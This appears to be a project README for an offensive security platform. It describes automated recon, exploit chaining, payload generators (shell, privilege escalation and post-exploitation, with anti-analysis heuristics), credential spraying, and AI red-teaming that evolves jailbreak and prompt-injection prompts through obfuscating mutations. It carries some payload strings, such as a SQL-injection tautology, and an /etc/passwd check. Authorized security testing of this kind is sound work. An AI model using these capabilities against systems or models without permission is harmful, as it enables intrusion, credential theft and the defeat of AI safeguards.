<p align="center">
  <img src="https://img.shields.io/badge/One%26Infinity-v2.0.0-blueviolet?style=for-the-badge&logo=shield&logoColor=white" alt="Version">
</p>

<h1 align="center">⚡ One&Infinity</h1>

<p align="center">
  <b>Autonomous Offensive Security Research Platform</b><br>
  <sub>Graph-driven attack orchestration · Multi-agent exploit chaining · AI red teaming · Mobile security · Web3 · Nim payload arsenal</sub>
</p>

<p align="center">
  <img src="https://img.shields.io/github/stars/Inf1n1tyDeS0ul/oneinfinity?style=flat-square&color=yellow" alt="Stars">
  <img src="https://img.shields.io/github/forks/Inf1n1tyDeS0ul/oneinfinity?style=flat-square&color=blue" alt="Forks">
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License">
  <img src="https://img.shields.io/badge/Version-2.0.0-blueviolet?style=flat-square" alt="v2">
  <img src="https://img.shields.io/badge/Python-3.11%2B-blue?style=flat-square&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Docker-Ready-2496ED?style=flat-square&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Distributed-Workers-purple?style=flat-square" alt="Distributed">
  <img src="https://img.shields.io/badge/Scope-Authorized%20Use%20Only-orange?style=flat-square" alt="Authorized">
</p>

---

## Table of Contents

- [What is One&Infinity?](#what-is-oneinfinity)
- [Why Not Just Use Nuclei / Burp / SQLMap?](#-why-not-just-use-nuclei--burp--sqlmap)
- [Installation](#-installation)
  - [One-Click Install (Recommended)](#one-click-install-recommended)
  - [Docker](#docker-recommended-for-manual-setup)
  - [Native Python](#native-python)
  - [Optional Services](#optional-services-postgresql--redis--neo4j)
- [Quick Start](#-quick-start)
- [Core Features](#-core-features)
  - [Recon & Intelligence](#-recon--intelligence)
  - [Vulnerability Detection](#-vulnerability-detection)
  - [Exploit Chaining Engine](#-exploit-chaining-engine)
  - [Validation Engine](#-validation-engine-false-positive-killer)
  - [Attack Graph Engine](#-attack-graph-engine)
  - [Agent Swarm](#-agent-swarm)
  - [Secret Intelligence Pipeline](#-secret-intelligence-pipeline-9-phases)
  - [Mobile Security](#-mobile-security-android--ios)
  - [AI Security Testing](#-ai-security-testing)
  - [Web3 / Smart Contract Security](#-web3--smart-contract-security)
  - [Nim Payload Arsenal](#-nim-payload-arsenal)
  - [Authenticated Testing Suite](#-authenticated-testing-suite)
  - [Traffic Capture & Replay](#-traffic-capture--replay)
  - [Adaptive Learning System](#-adaptive-learning-system)
  - [Bug Bounty Automation](#-bug-bounty-automation)
  - [God Mode](#-god-mode)
  - [MCP Integration](#-mcp-integration)
- [CLI Reference](#-cli-reference-75-commands)
- [Web UI](#-web-ui-43-pages)
- [Architecture](#-architecture)
- [Project Structure](#-project-structure)
- [Output Examples](#-output-examples)
- [Security & Safety](#-security--safety)
- [Docker Quick Reference](#-docker-quick-reference)
- [Roadmap](#-roadmap)
- [Credits & Acknowledgements](#-credits--acknowledgements)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [Contact](#-contact)

---

## What is One&Infinity?

One&Infinity is an **autonomous offensive security research platform** built for bug bounty hunters, red teamers, and security researchers who need more than a scanner.

Most tools identify vulnerabilities in isolation. One&Infinity connects them — building an attack graph of your target, letting an AI decision engine prioritize nodes, dispatching specialized agents, chaining findings into multi-step exploit paths, eliminating false positives through active validation, and learning from every result to improve the next scan.

**In concrete terms:**

1. A subdomain found by `subfinder` becomes a node in the attack graph
2. Nuclei finds an open redirect on that node
3. The exploit chain engine links it to an OAuth token being used in a CORS response
4. The swarm coordinator dispatches the Auth agent to test for account takeover
5. The validation engine confirms the chain is exploitable
6. A HackerOne-ready report is generated with estimated bounty payout

That sequence runs **autonomously**. No manual pivoting. No copy-pasting between tools.

---

## 🔥 Why Not Just Use Nuclei / Burp / SQLMap?

| Capability | Individual Tools | One&Infinity |
|---|---|---|
| Vulnerability scanning | ✅ Template-based | ✅ Template + adaptive |
| Cross-tool correlation | ❌ Manual | ✅ Automatic via attack graph |
| Exploit chaining | ❌ | ✅ 6 chain patterns, step-by-step PoC |
| False positive filtering | ❌ | ✅ Canary validation, endpoint liveness, CVSS gating |
| AI red teaming | ❌ | ✅ 800+ templates, genetic mutation, 6 attack categories |
| Mobile security (Android) | Partial (MobSF alone) | ✅ 12-phase pipeline, ADB forensics, deep-link fuzzer, SDK scanner |
| iOS security | ❌ | ✅ iOS companion app, Frida + Network Extension |
| Web3 / Smart contracts | ❌ | ✅ 14 vuln classes, Slither, Foundry PoC, EVM + Solana |
| Nim payload arsenal | ❌ | ✅ 6 native binaries: shell-gen, bypass-gen, fuzzer, post-exploit, privesc, payloads |
| Authenticated testing | ❌ | ✅ Login recorder, session replay, multi-account IDOR, race conditions |
| Learning / adaptive planning | ❌ | ✅ EMA per-vuln-type success tracking (α=0.30) |
| Autonomous multi-target hunting | ❌ | ✅ discover → prioritize → scan → report, unattended |
| Bug bounty report generation | ❌ | ✅ H1 / Bugcrowd / Intigriti markdown, with bounty estimate |
| Distributed scanning | ❌ | ✅ Redis-backed worker swarm, horizontally scalable |
| Containerized deployment | Partial | ✅ Multi-stage Docker image, 15-service distributed stack |
| MCP integration | ❌ | ✅ HackerOne MCP tools for Claude Code / Gemini CLI |

---

## 📦 Installation

### One-Click Install (Recommended)

Supports macOS 12+, Ubuntu 20.04+, Debian 11+, Kali Linux, Fedora 36+, Arch Linux:

```bash
curl -fsSL https://raw.githubusercontent.com/Inf1n1tyDeS0ul/oneinfinity/main/install.sh | bash
```

Or with options:

```bash
bash install.sh --no-docker     # Skip Docker installation
bash install.sh --skip-tools    # Skip external Go/Python tool installation
bash install.sh --update-only   # Update existing installation
```

The installer handles:
- Python venv creation and dependency installation
- Go tool installation (subfinder, httpx, nuclei, dalfox, etc.)
- Optional services (PostgreSQL, Redis, Neo4j)
- Initial workspace and `scope.yaml` setup

### Docker (Recommended for Manual Setup)

No Go toolchain, no Python venv, no tool installation — everything is baked into the image.

```bash
git clone https://github.com/Inf1n1tyDeS0ul/oneinfinity.git
cd oneinfinity
make setup          # creates .env from .env.example + data/ dirs
# Edit .env — set ONEINFINITY_API_KEY and any AI provider keys
make build && make up
```

The full distributed stack (API, Redis, workers, nginx, Grafana) starts at `http://localhost`.

```bash
make scan T=example.com          # full scan via API
make recon T=example.com         # recon only
make scale-recon N=4             # scale recon workers to 4
make workers-status              # inspect registered workers
```

Single-container CLI workflow:

```bash
docker run --rm \
  -v ~/.oneinfinity:/data \
  -e ONEINFINITY_API_KEY=<key> \
  ghcr.io/inf1n1tydes0ul/oneinfinity:latest \
  scan example.com --yes
```

### Native Python

#### Prerequisites

| Dependency | Version | Purpose |
|---|---|---|
| Python | 3.11+ | Core platform |
| Go | 1.21+ | Go-based security tools |
| Node.js | 18+ | Web UI only |
| Git | Any | Tool installation |

#### Core Setup

```bash
git clone https://github.com/Inf1n1tyDeS0ul/oneinfinity.git
cd oneinfinity

python3 -m venv venv
source venv/bin/activate

# Install core dependencies
pip install -e .

# Install with all optional extras
pip install -e ".[ai,mobile,web,distributed]"
```

#### Go Tools (Recommended)

```bash
# Reconnaissance
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/naabu/cmd/naabu@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Vulnerability scanning
go install github.com/hahwul/dalfox/v2@latest
go install github.com/Emoe/kxss@latest
go install github.com/dwisiswant0/crlfuzz@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/lc/gau/v2/cmd/gau@latest
```

#### Python Tools

```bash
pip install arjun s3scanner
git clone https://github.com/sqlmapproject/sqlmap.git ~/.local/sqlmap
git clone https://github.com/s0md3v/XSStrike.git ~/.local/xssstrike
git clone https://github.com/ticarpi/jwt_tool.git ~/.local/jwt_tool
```

#### Web UI (Optional)

```bash
# Terminal 1: backend
cd web/backend
pip install -r requirements.txt
python3 main.py

# Terminal 2: frontend
cd web/frontend
npm install
npm run dev
# → http://localhost:3000
```

#### System Health Check

```bash
oneinfinity doctor
# → Health Score: 🟢 10.0 / 10.0 (Healthy)
# → Working: 99 | Partial: 0 | Broken: 0
# → QA Scenarios: 34 pass / 0 fail
```

### Optional Services: PostgreSQL · Redis · Neo4j

#### PostgreSQL (Distributed Mode)

By default, findings are stored in a local SQLite file (`~/.oneinfinity/findings.db`). For distributed scanning or persistent data across Docker restarts, switch to PostgreSQL:

```bash
bash scripts/setup_postgres.sh
```

Add to `~/.zshrc` or `~/.bashrc`:

```bash
export POSTGRES_URL="postgresql://oneinfinity:<password>@localhost:5432/oneinfinity"
```

Verify:

```bash
source ~/.zshrc
oneinfinity doctor  # → [DBManager] Running in POSTGRES mode
```

| Variable | Default | Description |
|---|---|---|
| `POSTGRES_URL` | unset | Full DSN — activates Postgres mode when set |
| `ONEINFINITY_STORAGE_MODE` | `auto` | Force: `postgres`, `sqlite`, `distributed`, `memory` |

#### Redis (Distributed Worker Queue)

Redis enables cross-process event broadcasting, distributed worker queues, and swarm state sharing:

```bash
bash scripts/setup_redis.sh
```

Add to shell config:

```bash
export REDIS_URL="redis://localhost:6379/0"
```

Verify:

```bash
source ~/.zshrc
python3 -c "from core.redis_client import get_redis; r=get_redis(); print('Redis OK:', r.ping())"
```

| Variable | Default | Description |
|---|---|---|
| `REDIS_URL` | unset | Redis DSN — activates Redis transport when set |

> With both `POSTGRES_URL` and `REDIS_URL` set, the platform runs in full **DISTRIBUTED mode**.

#### Neo4j (Attack Graph)

Neo4j powers deep path queries, lateral movement simulation, and exploit chain detection. Without it, the graph engine falls back to in-memory NetworkX:

```bash
bash scripts/setup_neo4j.sh
```

Add to shell config:

```bash
export NEO4J_URI="bolt://localhost:7687"
export NEO4J_USERNAME="neo4j"
export NEO4J_PASSWORD="neo4j123"
export NEO4J_ENABLED=1
```

Neo4j Browser available at **http://localhost:7474**.

| Variable | Default | Description |
|---|---|---|
| `NEO4J_URI` | `bolt://localhost:7687` | Neo4j Bolt URI |
| `NEO4J_USERNAME` | `neo4j` | Neo4j username |
| `NEO4J_PASSWORD` | `neo4j123` | Neo4j password |
| `NEO4J_ENABLED` | `0` | Set to `1` to enable Neo4j backend |

---

## 🚀 Quick Start

### AI-Assisted Setup (Easiest)

If you have [Claude Code](https://github.com/anthropics/claude-code) or [Gemini CLI](https://github.com/google-gemini/gemini-cli):

```bash
git clone https://github.com/Inf1n1tyDeS0ul/oneinfinity.git
cd oneinfinity

# Claude Code:
claude "setup the project, install all dependencies, and run doctor"

# Gemini CLI:
gemini "setup the project, install all dependencies, and run doctor"
```

### First Scan

```bash
# Interactive — generates a recon plan for review before execution
oneinfinity scan example.com

# Autonomous — executes all 7 phases immediately, no prompts
oneinfinity scan example.com --yes

# Full-stack: recon → vuln scan → exploit chains → report
oneinfinity full-scan example.com --report all

# God Mode: every capability, zero skip
oneinfinity god-mode example.com
```

### Autonomous Bounty Hunting

```bash
# Fully autonomous: fetch programs → prioritize → scan → report
oneinfinity hunter-start

# Single-target autonomous pipeline
oneinfinity hunter-scan example.com

# Multi-target parallel from file
oneinfinity swarm targets.txt
```

---

## ⚡ Core Features

### 🕸️ Recon & Intelligence

- **Subdomain enumeration** — subfinder, amass, assetfinder, findomain, dnsx in a single coordinated phase
- **Certificate transparency monitoring** — crt.sh passive monitoring plugin
- **ASN / IP range enumeration** — BGP/ASN API-based IP block discovery
- **HTTP probing & fingerprinting** — httpx, naabu, whatweb with technology detection
- **JS endpoint extraction** — katana + regex extraction from live JavaScript files; JS chunk enumerator; source map reconstructor
- **Cloud asset discovery** — DNS patterns and CIDR matching for AWS, GCP, Azure assets
- **OSINT collection** — HackerTarget, DNSDumpster, URLScan, Wayback Machine, GitHub dorks, Shodan
- **Org-domain intelligence** — maps a GitHub organization to its likely domains via public repo metadata
- **Port scanning** — naabu fast scan + targeted nmap service detection
- **Web crawling** — katana, hakrawler, gauplus, waybackurls with dedup
- **Adaptive recon engine** — tech-stack-aware recon that skips irrelevant modules and deepens coverage on high-yield patterns
- **OpenAPI crawler** — auto-discovers and parses OpenAPI / Swagger specs to build an endpoint inventory
- **GitHub advanced dorking** — GitDorker-style comprehensive dork set with org-aware rate limiting and token rotation

### 🔍 Vulnerability Detection

- **Template scanning** — Nuclei v3 with `-jsonl` output, structured result ingestion
- **XSS** — dalfox, kxss, XSStrike; reflected + stored + DOM; blind XSS with callback
- **SQL injection** — sqlmap, commix; error-based, union, time-blind, NoSQL injection
- **CRLF injection** — crlfuzz
- **SSRF** — dedicated Go SSRF engine + out-of-band callback listener
- **SSTI** — arithmetic canary (`49` from `7*7`) detection
- **XXE** — XML external entity injection scanner
- **Path traversal** — path traversal scanner with encoding bypass variants
- **Deserialization** — Java/Python/PHP deserialization pattern scanner
- **HTTP request smuggling** — CL-TE, TE-CL, TE-TE variants via dedicated smuggling engine
- **HTTP/2** — h2c upgrade, HTTP/2 attack engine
- **WebSocket** — WebSocket vulnerability scanner
- **gRPC** — gRPC endpoint scanner
- **DNS rebinding** — DNS rebinding attack surface detection
- **DNS security** — DNSSEC, zone transfer, subdomain takeover
- **Host header injection** — cache poisoning, password reset poisoning
- **HTTP parameter pollution** — HPP scanner
- **Prototype pollution** — client-side + source scanner
- **Cache deception** — web cache deception scanner
- **CORS** — CORS misconfiguration scanner
- **OAuth token leak** — OAuth token exposure in traffic and responses
- **JWT vulnerabilities** — jwt_tool, Rust-based JWT cracker; alg=none, weak secret, key confusion
- **Secret scanning** — trufflehog, gitleaks, jwt_tool; binary DEX scanning for mobile
- **S3 misconfiguration** — s3scanner
- **Directory / path fuzzing** — ffuf, gobuster, dirsearch with wordlist auto-selection
- **Parameter discovery** — arjun, gf (pattern-based endpoint filtering)
- **API security** — GraphQL introspection + attack engine, BOLA, mass assignment, rate limit bypass, version bypass
- **Cloud misconfiguration** — S3, Elasticsearch, Kubernetes, credential leakage checks
- **Business logic** — price manipulation, coupon stacking, workflow bypass, race conditions, captcha bypass
- **CI/CD vulnerability scanner** — pipeline misconfiguration and secrets in CI/CD files
- **Container escape scanner** — Docker/Kubernetes escape surface detection
- **Supply chain attack engine** — dependency confusion, typosquatting, npm/PyPI attack surface
- **Anomaly / zero-day detection** — timing fingerprints, status differentials, reflection leakage

### 🔗 Exploit Chaining Engine

Six canonical multi-step chain patterns — each detects qualifying findings, constructs a step-by-step PoC, and generates a structured report:

| Chain | Entry | Pivot | Impact |
|---|---|---|---|
| `ssrf_to_cloud_metadata` | SSRF | Cloud metadata endpoint | IAM credential theft |
| `xss_to_ato` | Stored/Reflected XSS | Victim session | Account takeover |
| `sqli_to_rce` | SQLi (error/union/time) | File write / UDF | Remote code execution |
| `idor_to_priv_esc` | IDOR | Sensitive object | Privilege escalation |
| `cors_to_credential_theft` | CORS misconfiguration | Authenticated endpoint | Credential exfiltration |
| `open_redirect_to_oauth_hijack` | Open redirect | OAuth `redirect_uri` | OAuth token hijack |

Each chain is detected automatically when confirmed findings match the trigger criteria. The PoC generator selects the best-match finding per step, producing accurate, executable scripts with each chain. Graph-based chain detection (`graph_chain_detector.py`) also discovers chains directly from the Neo4j attack graph without requiring individual confirmed findings.

### ✅ Validation Engine (False Positive Killer)

Every finding passes through a two-stage validation pipeline before reaching a report.

**Stage 1 — Active re-testing** (`finding_validation_engine.py`):

- **XSS** — canary `<img>` injection with unique token verification (~90% accuracy)
- **SQLi error-based** — response differential on injected syntax error (~85% accuracy)
- **SQLi time-blind** — 4-second threshold timing verification (~70% accuracy, conservative)
- **SSRF** — out-of-band callback validation via collaborator-style endpoints
- **LFI** — `/etc/passwd` and `/etc/hosts` content pattern matching
- **Auth bypass** — response code + body length differential
- **SSTI** — arithmetic canary in response body
- **Open redirect** — location header destination verification

**Stage 2 — Confidence classification** (`FindingClassifier`):

| Status | Criteria | Report Included |
|--------|----------|-----------------|
| `confirmed` | confidence ≥ 0.70 + evidence/payload present | ✅ Yes |
| `unverified` | confidence 0.35–0.69 | ✅ Yes (marked) |
| `false_positive` | confidence < 0.35 | ❌ Excluded |
| `simulated` | source_type = simulated | ❌ Excluded |

AI-theory findings are automatically capped at `unverified` and require independent tool confirmation. The deduplication engine uses SHA-256 fingerprints of `(vuln_type, normalized_url, parameter)` — tool-agnostic, so dalfox and nuclei finding the same XSS produces one finding, not two.

### 🧠 Attack Graph Engine

```
Assets (subdomains, IPs, endpoints, parameters)
  → Nodes in weighted directed graph
    → 15 trigger rules fire automatically on graph updates
      → Risk scoring: type_weight × connectivity × vuln_bonus × tested_discount
        → BFS path finding from entry nodes to high-impact targets
          → Attacker path simulation with step-by-step lateral movement
```

- **Dual backend** — In-memory NetworkX for fast local use; Neo4j for persistent graph queries at scale
- **Graph query engine** — Cypher-powered query interface; callers/callees/paths across large target sets
- **Risk analyzer** — Multi-factor node risk scoring driving AI agent dispatch priority
- **Graph brain daemon** — Always-on loop that continuously monitors the graph, fires trigger rules, and dispatches agents as new nodes appear
- **Export formats** — JSON, DOT, SVG; visualized in the web UI with ForceGraph2D (glow/pulse, NodeInfoPanel, RiskPanel)

### 🐝 Agent Swarm

Eight specialized agents run in parallel, each with its own hypothesis generation loop and EMA-tracked success rates:

| Agent | Tools | Collaboration Trigger |
|---|---|---|
| XSS | dalfox, kxss | XSS finding → dispatches Auth agent |
| SQLi | sqlmap, commix | SQLi finding → dispatches IDOR agent |
| SSRF | nuclei SSRF templates | SSRF finding → dispatches IDOR agent |
| IDOR | nuclei, ffuf ID enumeration | — |
| Auth Bypass | jwt_tool, nuclei auth templates | — |
| Business Logic | BusinessLogicEngine, nuclei logic templates | — |
| API Security | GraphQL, BOLA, mass assignment | — |
| Mobile Security | 12-phase mobile pipeline | — |

Agent collaboration is rule-based and automatic — a confirmed SQLi triggers the IDOR agent because object access often becomes reachable after DB read escalation.

### 🔒 Secret Intelligence Pipeline (9 Phases)

1. **Scope resolution** — target domain → GitHub dork queries
2. **GitHub dorking** — code search with org-aware rate limiting (token rotation, EMA quota tracking)
3. **URL deduplication** — SHA-256 fingerprint dedup before fetching
4. **Org graph mapping** — GitHub org → domain → first-party vs. third-party attribution
5. **Content fetch + detection** — adaptive entropy thresholds, 32 regex patterns, DEX binary scanning
6. **Finding deduplication** — cross-repo dedup on `(secret_type, value_hash)`
7. **Live validation** — read-only API calls with 3-second timeout; Redis, AWS, GitHub, Stripe checks
8. **AI triage** — severity matrix: `ownership_confidence × live_verified × prod_context`
9. **Normalization** — raw value stripped after scoring; ownership, confidence, reason persisted

Production context (`prod/live` in code path) prevents severity tier-down for high-specificity secret types (AWS keys, GitHub PATs).

### 📱 Mobile Security (Android + iOS)

#### Android — 12-Phase Pipeline

```bash
oneinfinity mobile-analyze target.apk
```

| Phase | Engine | What It Does |
|---|---|---|
| Upload + dedup | `upload_manager.py` | SHA-256 dedup, SQLite metadata |
| Static analysis | APKTool + JADX + MobSF | Manifest, 24 dangerous permissions, 14 code vuln patterns |
| AI reverse engineering | `ai_reverse_engineer.py` | Hidden endpoints, auth flaws, hardcoded secrets via 14 rule patterns |
| Frida script generation | `frida_script_generator.py` | Auto-generates SSL bypass, root bypass, auth/crypto/network hooks |
| Secret detection | TruffleHog + Gitleaks + DEX binary scan | Keys, tokens, credentials in APK binary and decompiled source |
| API discovery | Retrofit / OkHttp / URLSession / GraphQL | Extracts live API endpoint list for further scanning |
| Component testing | Drozer + androguard + manifest parser | Exported activities, content providers, IPC security |
| Dynamic analysis | Frida + Objection + RMS | SSL bypass verification, root bypass, keystore inspection |
| Network analysis | Static URL scan + Burp proxy | Certificate pinning, cleartext traffic, proxy integration |
| API attack testing | `mobile_api_attack_engine.py` | IDOR, auth bypass, mass assignment, injection on discovered APIs |
| ADB forensics | `adb_forensics.py` | Live device forensics, file system inspection, logcat sentinel |
| Deep-link fuzzing | `deep_link_fuzzer.py` | Intent fuzzing, deep-link injection, exported activity attack surface |

**Additional Android features:**
- `sdk_scanner.py` — Scans third-party SDK integrations for known CVEs and data leakage
- `intent_fuzzer.py` — Broadcast receiver and activity intent fuzzing
- `android_studio_integration.py` — Connects to AS debugger for live inspection
- `mastg_knowledge.py` — OWASP MASTG-aligned test catalogue

#### Android Companion App

A VPN-capture Android app (`android-companion/`) that forwards live device traffic to the backend for real-time analysis:

```bash
# Build APK
cd android-companion && ./gradlew assembleDebug

# Install
adb install app/build/outputs/apk/debug/app-debug.apk
```

Features: VPN-based system-wide traffic capture · QR code + mDNS auto-discovery · Attack launcher integration · Frida script push from Web UI.

#### iOS Companion App

Swift-native iOS app (`ios-companion/`) for traffic capture and Frida instrumentation:

- **All devices**: Network Extension traffic capture, WebSocket backend connection, Attack Launcher
- **Jailbroken devices**: Frida instrumentation (`frida-server`), SSL bypass, jailbreak bypass, keychain hooks

Requires Xcode 15.0+ and iOS 16.0+.

### 🤖 AI Security Testing

```bash
# Full AI model security scan
oneinfinity ai-test https://api.example.com/chat --all

# Red team campaign with genetic prompt evolution
oneinfinity ai-redteam https://api.example.com/chat \
  --campaign jailbreak --prompts 5000

# Agentic system testing (tool abuse, prompt injection, data exfiltration)
oneinfinity ai-agent-test https://api.example.com --all
```

- **800+ prompt templates** across 6 attack categories: jailbreak, prompt injection, data exfiltration, RAG poisoning, agent abuse, model inversion
- **18 mutation strategies** — base64, unicode, HTML entity, role reversal, nested context, instruction camouflage, and more
- **Genetic algorithm evolution** — prompts that achieve partial compliance are mutated and crossed for next-generation variants
- **Adversarial WAF engine** — tests AI-backed WAF bypass with adaptive mutation
- **LLM DoS engine** — token flooding, infinite loop prompts, resource exhaustion
- **LLM supply chain scanner** — poisoned model weights, dependency confusion in ML pipelines
- **Multi-turn chaining** — multi-step conversation attacks that establish false context before injecting
- **Agentic system testing** — tool-call injection, API abuse, sandboxed data exfiltration detection
- **Framework integration** — Garak, PyRIT, Giskard, Purple Llama, Rebuff, IBM ART

### 🌐 Web3 / Smart Contract Security

```bash
# Scan a Solidity file for vulnerabilities
oneinfinity scan Contract.sol --web3

# Scan a deployed contract by address (EVM)
oneinfinity scan 0x1234...abcd --web3 --network mainnet
```

**Smart Contract Scanner** (`web3/smart_contract_scanner.py`) — 14 vulnerability classes:

| # | Vulnerability Class |
|---|---|
| 1 | Reentrancy (cross-function, cross-contract, read-only) |
| 2 | Integer overflow/underflow |
| 3 | Access control bypass (missing `onlyOwner`, `tx.origin` auth) |
| 4 | Unchecked external calls |
| 5 | Self-destruct exposure |
| 6 | Delegatecall injection |
| 7 | Flashloan attack surface |
| 8 | Price oracle manipulation |
| 9 | Signature replay (missing nonce / chainId) |
| 10 | Unprotected initializer (proxy upgrade pattern) |
| 11 | Randomness manipulation (`block.timestamp`, `blockhash`) |
| 12 | Griefing / DoS via gas limit |
| 13 | Front-running / sandwichable transactions |
| 14 | Token approval race condition (ERC20 approve/transferFrom) |

- **Slither integration** — runs static analysis and parses JSON output when installed
- **Foundry PoC generator** — auto-generates forge test skeletons for confirmed findings
- **EVM token scanner** — honey-pot detection, rug-pull vectors, hidden fees
- **Solana scanner** — Solana program vulnerability patterns

### ⚔️ Nim Payload Arsenal

Six native compiled binaries for high-performance payload generation. Each binary emits NDJSON to stdout, is SHA-256 integrity verified before execution, and includes anti-analysis heuristics:

| Binary | Purpose |
|---|---|
| `oi-shell-gen` | Polymorphic shell payload generator (multi-OS, multi-encoding) |
| `oi-bypass-gen` | 403/WAF bypass payload generator |
| `oi-payloads` | Context-aware payload library with encoding variants |
| `oi-post-exploit` | Post-exploitation template generator |
| `oi-privesc-gen` | Privilege escalation template generator (Linux/Windows) |
| `oi-fuzzer` | High-throughput fuzzing payload generator |

Python wrapper: `arsenal/nim_payload_engine.py` — zero-dependency interface, returns `list[dict]`, empty list if binary absent.

Controlled via env vars:
```bash
ONEINFINITY_SKIP_INTEGRITY=1   # skip SHA-256 check (dev/test)
ONEINFINITY_STUB_BYPASS=1      # disable anti-analysis heuristics
ONEINFINITY_ENV=production     # blocks SKIP_INTEGRITY flag
```

### 🔐 Authenticated Testing Suite

One&Infinity can record, manage, and replay login sessions to test authenticated attack surfaces:

```bash
# Record a login session interactively
oneinfinity _internal_auth_session --record --target example.com --session my_session

# Use a saved session in a scan
oneinfinity god-mode example.com --auth-session my_session
oneinfinity simulate-workflow example.com --cookie "session=..." --token "Bearer ..."
```

| Module | Capability |
|---|---|
| `login_form_detector.py` | Auto-detects login forms (standard, SSO, MFA) |
| `login_session_recorder.py` | Records full HTTP session with cookie extraction |
| `auth_session_context.py` | Session context manager for all scan phases |
| `session_manager.py` | Multi-session store with role-based labeling |
| `session_replay.py` | Authenticated request replay with token refresh |
| `multi_account_idor_engine.py` | Cross-account IDOR testing: victim vs attacker role matrix |
| `go_credential_spray.py` | Go-accelerated credential spraying |
| `authenticated_test_suite.py` | Full authenticated OWASP test suite |

### 📡 Traffic Capture & Replay

Real-time HTTP/HTTPS traffic interception across web, Android, and iOS:

```bash
# List captured traffic
oneinfinity traffic-list --target example.com --limit 100

# Export traffic
oneinfinity traffic-export --format burp --output traffic.xml

# Replay a specific captured request
oneinfinity replay-request <request_id>
oneinfinity replay-request <request_id> --payload "' OR 1=1--"

# Replay a discovered attack
oneinfinity replay-attack <attack_id>
```

- **Web proxy** — mitmproxy-based HTTPS interception with OneInfinity addon (`mitm_oneinfinity_addon.py`)
- **Mobile traffic** — VPN-capture from Android/iOS companion apps → real-time backend analysis
- **eBPF capture** — kernel-level traffic capture (`mobile_ebpf_capture.py`) for non-proxy-aware apps
- **tcpdump capture** — raw packet capture fallback
- **Unified capture** — combines proxy + eBPF + tcpdump into a single traffic stream
- **Traffic correlation engine** — correlates HTTP requests to session contexts, finding triggers, and attack sequences
- **Differential scanner** — compares authenticated vs unauthenticated responses to find access control issues
- **Race condition engine** — 10–100 concurrent parallel requests to detect race conditions
- **Request repeater** — Burp-style repeater for manual request modification

### 🔄 Adaptive Learning System

- Per-vulnerability-type success rates tracked with EMA (α=0.30), persisted to `evolution.db`
- Scan approach adjusts based on historical KB — high-yield tech stacks get deeper coverage on repeat visits
- Pattern miner extracts `VulnPattern` / `TargetInsight` objects from every completed scan
- Monte Carlo attack simulation (N=200 Bernoulli trials, 23-path catalog, 6 probability factors) recommends optimal attack strategy per target profile
- **Cross-run persistent memory** (`learning/persistent_memory.py`) — JSON-backed intelligence store survives individual scan runs: successful payloads ranked by hit count, failed payloads avoided, high-value hosts re-prioritized, successful exploit chains replayed
- **Real-time learner** — updates EMA success rates after each finding confirmation without waiting for scan completion
- **Neo4j learning graph backfill** — `oneinfinity learn backfill` imports all existing PostgreSQL findings into Neo4j for graph-powered pattern mining
- **Self-evolving architecture** — emits `FEATURE_ADDED` events that auto-update `ARCHITECTURE.md` and `SKILLS.md`

### 💰 Bug Bounty Automation

```bash
oneinfinity hunter-start                              # fully autonomous
oneinfinity hunter-scan example.com                  # directed single-target
oneinfinity hunter-start --strategy aggressive        # broad+fast mode
oneinfinity hunter-start --strategy stealthy          # evasive, 1 worker
oneinfinity hunter-start --strategy high-value        # auth/API/payment ROI focus
oneinfinity hunter-start --benchmark-ref burp.json    # post-hunt accuracy comparison
```

- Fetches live programs from HackerOne, Bugcrowd, Intigriti
- Scores targets on 6 dimensions: technology risk, cloud exposure, sensitive path density, historical bounty data, scope breadth, asset age
- **ROI strategy engine** (`bounty_strategy_engine.py`) re-ranks URLs by attack value before scanning: auth/payment/API paths scored up; static assets scored down; fintech/banking targets multiplied by 1.4×
- **Elite hunting modes**: `aggressive` (8 workers, broad coverage), `stealthy` (1 worker, human-paced delays), `high-value` (filters to auth/API/payment targets, full exploit chaining)
- **Post-hunt benchmarking** (`--benchmark-ref`) compares findings against Burp/Nuclei reference and emits precision/recall/F1 metrics
- Generates platform-specific reports (H1 / Bugcrowd / Intigriti) with CVSS 3.1, evidence blocks, and CLI reproduction commands per finding
- Bounty ROI engine estimates payout range per finding type

### 💀 God Mode

```bash
oneinfinity god-mode example.com
oneinfinity god-mode example.com --background    # detach after Stage 1
oneinfinity god-mode status                       # check running session
oneinfinity god-mode logs <scan_id> --follow      # tail logs
oneinfinity god-mode stop <scan_id>               # stop session
```

God Mode is the full adaptive cascade — every capability runs in optimal sequence, nothing skipped:

1. **Stage 1 (Foundation)** — recon, port scan, web crawl, JS extraction, secret hunt
2. **Stage 2 (Attack Surface)** — attack graph construction, AI decision engine boot, swarm dispatch
3. **Stage 3 (Exploitation)** — all 8 agents run in parallel with cross-agent collaboration
4. **Stage 4 (Deep Research)** — zero-day theory generation, custom test execution, app model building
5. **Stage 5 (Chaining)** — exploit chain detection, PoC generation, multi-finding validation
6. **Stage 6 (Reporting)** — CVSS scoring, bug bounty report generation, bounty ROI estimate

Supports `--auth-session` to run all stages with authenticated context. Supports `--no-swarm` and `--no-research` for lighter modes.

### 🔌 MCP Integration

One&Infinity exposes HackerOne and Bugcrowd APIs as MCP tools (`mcp/hackerone_mcp_tool.py`, `mcp/server.py`) for use directly inside Claude Code or Gemini CLI:

```bash
# Register the MCP server in your Claude Code settings
# Then call tools directly from Claude Code:
# h1_get_scope("shopify")
# h1_list_programs()
```

Available MCP tools:
- `h1_get_scope` — fetch in-scope assets for a HackerOne program
- `h1_list_programs` — list all public HackerOne programs with scope and bounty data
- Submit functions require **explicit human approval** — cannot auto-submit

---

## 📖 CLI Reference (75+ Commands)

```
oneinfinity <command> [options]
```

### Core

| Command | Description |
|---|---|
| `doctor` | QA + audit + regression + AI analysis health check |
| `setup` | Create workspace and scope.yaml template |
| `run` | Autonomous framework: recon → exploit → report |
| `scan` | Generate recon script for target domain(s) |
